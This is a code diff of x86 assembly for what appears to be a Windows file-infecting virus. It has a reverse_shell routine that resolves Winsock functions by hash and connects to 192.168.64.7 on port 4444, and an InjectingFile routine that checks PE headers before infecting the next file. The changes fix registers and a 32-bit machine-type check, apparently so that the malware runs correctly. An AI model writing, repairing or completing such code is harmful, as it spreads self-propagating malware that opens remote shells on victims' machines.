@@ -29,7 +29,7 @@ get_eip:
 	Sub Esp, Ecx
 	Xor Eax, Eax
 	Lea Edi, [Ebp - 4H]
-	Mov Ch, 100H
+	Mov Ch, 1H
 	Std
 	Rep Stosd
 	Cld
@@ -145,7 +145,7 @@ reverse_shell:
 	Mov Cx, 190H
 	Sub Esp, Ecx					; Creating space for WSAData
 	Push Esp					; lpWSAData
-	Push Eax
+	Push Ecx
 	Push 6B8029H					; hash('ws2_32.dll', 'WSAStartup')
 	Call hash_api
 
@@ -169,7 +169,7 @@ reverse_shell:
 	Push 0740A8C0H 					; 192.168.64.7
 	Mov Eax, 5C110102H
 	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
-	Push Eax					; namelen = 16 bytes
+	Push Eax					; namelen 
 	Push Esp					; *name: 5C110002
 	Push Edi					; Arg 1(s): WSASocketA() Handler
 	Push 6174A599H					; hash("ws2_32.dll", "connect")
@@ -190,7 +190,7 @@ reverse_shell:
 zero_mem_struct:
 	Push Eax					; NULL
 	Loop zero_mem_struct				; Push 0x00000000 18 times
-	Mov Word Ptr [Esp + 3CH], 101H	; dwFlag (60 bytes from the top of the stack)
+	Mov Word Ptr [Esp + 3CH], 101H			; dwFlag (60 bytes from the top of the stack)
 	Mov Byte Ptr [Esp + 10H], 44H
 	Lea Edi, [Esp + 10H]
 
@@ -450,7 +450,7 @@ InjectingFile:
 	Add Edi, Ebx					; PE signature
 
 	Mov Eax, [Edi + 4H]		
-	Cmp Eax, 14CH					; Check if the file is 32 bit executable or not
+	Cmp Ax, 14CH					; Check if the file is 32 bit executable or not
 	Jne infect_next_file
 
 	Mov Eax, [Edi + 3CH]
